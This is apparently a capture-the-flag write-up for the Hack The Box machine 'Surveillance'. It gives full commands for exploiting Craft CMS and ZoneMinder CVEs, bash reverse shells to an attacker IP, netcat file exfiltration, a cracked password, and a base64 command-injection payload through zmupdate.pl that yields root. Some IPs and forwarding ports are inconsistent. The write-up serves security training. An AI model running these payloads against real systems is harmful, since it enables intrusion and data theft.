---
categories:
- write-up
- Linux
- Medium
date: "2024-12-12T00:00:00Z"
title: "Surveillance - Hack The Box"
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list

---

![Surveillance Logo](/assets/images/HTB/surveillance/Surveillance-LOGO.png)


Surveillance is a Medium-rated machine on Hack The Box (HTB). The path begins with identifying a CMS vulnerability on the webpage hosted on port 80, which grants initial access. Through enumeration, I uncovered a database file containing an encrypted password. Cracking this password allows access to a ZoneMinder instance running on localhost. By exploiting a known vulnerability in ZoneMinder, I elevate my access to the `zoneminder` user. The final step involves leveraging sudo privileges to achieve full root access.


{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}

- CMS
- Craft CMS
- Unauth-RCE
- CVE-2023-41892
- Port forwarding
- CVE-2023-26035

{{% /details %}}
{{< /callout >}}

## Enumeration 

### Port Scan

First, let's kick things off with an Nmap scan to enumerate open ports and services on the target:

```bash
nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
```

```bash
# Nmap 7.94SVN scan initiated Thu Mar 21 14:48:00 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
Nmap scan report for 10.10.11.245
Host is up, received reset ttl 63 (0.058s latency).
Scanned at 2024-03-21 14:48:01 EDT for 56s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals SSH on port 22 and a web server (nginx) on port 80. The HTTP service redirects to `http://surveillance.htb/`, so let's add this to our `/etc/hosts` file:

```bash
echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```
Next, we use `whatweb` to gather more details about the web service:

```bash
whatweb surveillance.htb
```

![WhatWeb Results](/assets/images/HTB/survellance/surv1.png)

From the `whatweb` results, I can see from the beginning that we will be dealing with a Content Management System (CMS), specifically **Craft CMS**.

## FootHold

![Craft CMS Login Page](/assets/images/HTB/survellance/surv2.png)

Visiting the website, we identify the CMS version and discover a known vulnerability, **[CVE-2023-41892](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_unauth_rce_cve_2023_41892/)**, which affects Craft CMS versions between **4.0.0-RC1 and 4.4.14**. This vulnerability allows for *unauthenticated remote code execution (RCE)*.

* The vulnerability lies in how Craft CMS handles functionalities like `\GuzzleHttp\Psr7\FnStream`, which allows for selective method invocation. An attacker can craft a special request that triggers this functionality and injects malicious code. This code could then be written to the system's log file.
* Since Craft CMS parses the log files for certain purposes, the injected code can be executed, granting the attacker RCE capabilities.

We find a working exploit on [GitHub](https://github.com/Faelian/CraftCMS_CVE-2023-41892).

```bash
python3 craft-cms.py http://surveillance.htb/
```

Executing this exploit grants us shell access as `www-data`.

![Exploit Execution](/assets/images/HTB/survellance/surv3.png)

To get a more stable shell, I execute a reverse shell command:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
```

## Privilege Escalation to Matthew 

While enumerating the system as `www-data`, I found an interesting backup file located at `/var/www/html/craft/storage/backups`. I transferred this SQL backup file to my local machine for inspection.

* On the receiving (attacker) machine, set up a listener:
```bash
nc -nlvp 443 > surv.zip 
```

* On the sending (victim) machine, send the file:
```bash
nc 10.10.14.13 443 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Inspecting the SQL file reveals that it creates several database tables and, near the end, inserts user data.

![SQL file contents](/assets/images/HTB/survellance/surv4.png)

From the image above, I can see that the user `matthew` is an admin and has a long string that appears to be an encrypted password. I used [CrackStation](https://crackstation.net/) to crack the hash:
* `39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`

![CrackStation result](/assets/images/HTB/survellance/surv5.png)

I got a password match: **starcraft122490**.

![SSH login as Matthew](/assets/images/HTB/survellance/surv6.png)

## Escalating to ZoneMinder

With access to Matthew's account, I continued enumerating, checking for locally running services that might be exploitable:

```bash
netstat -tunlp
```

![netstat output](/assets/images/HTB/survellance/surv7.png)

The output shows a service running on port 8080. I checked the page with `curl`, but it returned a large amount of HTML code, so I decided to do port forwarding with *chisel* to explore it in a browser.

*   **On Attacking machine (as server):**
    ```bash
    ./chisel_lin server -p 443 --reverse
    ```
*   **On Victim machine (as client):**
    ```bash
    ./chisel_lin client 10.10.14.226:443 R:4444:127.0.0.1:4545
    ```

![Chisel connection](/assets/images/HTB/survellance/surv8.png)


After establishing the connection, I could access the page hosted on `localhost:8080` and realized that **ZoneMinder** is not just a user, but also a service/software.

![ZoneMinder Login](/assets/images/HTB/survellance/surv9.png)

Then I looked for ZoneMinder exploits on Google and encountered **CVE-2023-26035**: "Unauthenticated Remote Code Execution in ZoneMinder". I wasn't able to find information related to the specific version, but since the exploit seemed easy to run, I decided to give it a try.

The vulnerability lies in the way ZoneMinder handles the "snapshot" function. Due to a missing authorization check, an attacker can manipulate this function to create a new monitor instead of fetching an existing one. By crafting a special request, the attacker can inject malicious code that gets executed by the ZoneMinder server.

I found a working Exploit on [GitHub](https://github.com/rvizx/CVE-2023-26035):

```bash
proxychains python3 exploit-zone.py -t http://127.0.0.1:8080/ -ip 10.10.14.13 -p 445
```
***NOTE:*** This exploit worked for me, but not consistently; I had to run it 2-3 times to get a shell.

![ZoneMinder Exploit Shell](/assets/images/HTB/survellance/surv10.png)

This grants us shell access as the `zoneminder` user.


## Escalating to Root
As the `zoneminder` user, I checked for any `sudo` privileges.

![sudo -l output](/assets/images/HTB/survellance/surv11.png)

Checking for sudo privileges, we find that the `zoneminder` user can run scripts matching the pattern `zm*.pl` in `/usr/bin`. I looked online for "escalate privileges zoneminder zm.pl" and found an interesting [GitHub Security Advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw).

The advisory states that this affects versions `< 1.36.33`. I checked the running version:

```bash
dpkg -s zoneminder | grep Version
```
This command checks the version of the installed `zoneminder` package.
![ZoneMinder Version](/assets/images/HTB/survellance/surv12.png)

I checked the ZoneMinder config files in `/etc/zm` and found the password in clear text!

![ZoneMinder Password](/assets/images/HTB/survellance/surv13.png)

* `ZoneMinderPassword2023`

After reading for a while, I identified **zmupdate.pl** as a vulnerable script and crafted a payload to exploit it. The script takes user input directly into a bash connection query, making it susceptible to command injection.

![zmupdate.pl source code](/assets/images/HTB/survellance/surv14.png)


To exploit this, we create a payload that provides a reverse shell. First, we encode the payload in base64 to safely pass it as a command:

```bash
echo  "bash -c 'bash -i >& /dev/tcp/10.10.14.35/443 0>&1' " | base64 -w0 
```
Now, I send the payload. Since user input is passed directly into a bash connection query, we can inject a bash command to alter its behavior and get a root shell:

```bash
sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEnIAo=" |base64 -d |bash;'
```

![Root Shell](/assets/images/HTB/survellance/surv15.png)